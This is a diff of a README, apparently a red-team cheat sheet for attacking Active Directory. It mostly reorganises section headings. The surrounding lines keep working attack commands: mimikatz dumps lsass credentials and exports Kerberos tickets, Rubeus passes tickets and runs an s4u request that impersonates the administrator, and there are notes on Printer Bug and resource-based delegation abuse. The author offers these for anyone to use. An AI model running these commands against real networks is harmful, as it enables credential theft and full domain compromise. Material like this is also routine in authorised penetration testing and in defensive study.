@@ -4,8 +4,8 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 * **[ACLs/ACEs permissions](#acls-possible-abuse)**
 * **[LDAP Filters as alternative](#ldap-filters)**
-* **Enumeration**
-	* **[Domain Enumeration](#powerview-enumeration)**
+* **[Situational Awareness](#situational-awaress)**
+	* **[Domain Enumeration](#domain-enumeration)**
 		* [Forest Trust](#forest-trust)
 		* [ASREP Roasting](#asrep-roasting)
 		* [Kerberoasting](#kerberoasting)
@@ -13,7 +13,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* **[Constrained Language Mode](#constrained-language-mode)**
 		* [CLM Enumeration](#clm-enumeration)
 		* [Dump lsass with rundll32](#dump-lsass-process-with-signed-binary)
-* **Delegation**
+* **[Delegations](#delegations)**
 	* [Unconstrained Delegation](#unconstrained-delegation)
 		* [Printer Bug](#printer-bug)
 		* [Extract TGTs](#extract-tgt)
@@ -136,7 +136,8 @@ $adsiSearcherObj.FindAll()
 ```
 _Note: These LDAP filters can be used with `[adsisearcher]` builtin function in powershell. Any extra commands can be found [here](https://mlcsec.com/active-directory-domain-enumeration-part-2). Amazing cheatsheet by [@mlcsec](https://twitter.com/mlcsec)_
 
-# Domain Enumeration
+# Situational Awareness
+## Domain Enumeration
 ### Forest Trust
 ```
 # Map all domain trusts
@@ -168,7 +169,7 @@ Get-DomainUser -TrustedToAuth -Properties name,msds-allowedtodelegateto
 ```
 You can abuse these delegation permission by referring [here](#unconstrained-delegation)
 
-# Constrained Language Mode (CLM) / WDAC / Device Guard
+## Constrained Language Mode (CLM) / WDAC / Device Guard
 ### CLM Enumeration
 ```
 $ExecutionContext.SessionState.LanguageMode
@@ -191,7 +192,8 @@ mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
 mimikatz# sekurlsa::logonpasswords
 ```
 
-# Unconstrained Delegation
+# Delegations
+## Unconstrained Delegation
 ### Printer Bug
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
 
@@ -218,7 +220,7 @@ mimikatz# sekurlsa::tickets /export
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
-# Constrained Delegation
+## Constrained Delegation
 ### s4u delegation
 This attack is possible if _msds-AllowedToDelegateTo_ is set.
 * with rc4 hash in hand
@@ -238,7 +240,7 @@ Rubeus.exe tgtdeleg /nowrap
 Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
 ```
 
-# Resource-Based Constrained Delegation
+## Resource-Based Constrained Delegation
 This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property. There are few requirements needed in order to perform this attack.
 | Name                                              | Value       |
 | ------------------------------------------------- | ----------- |
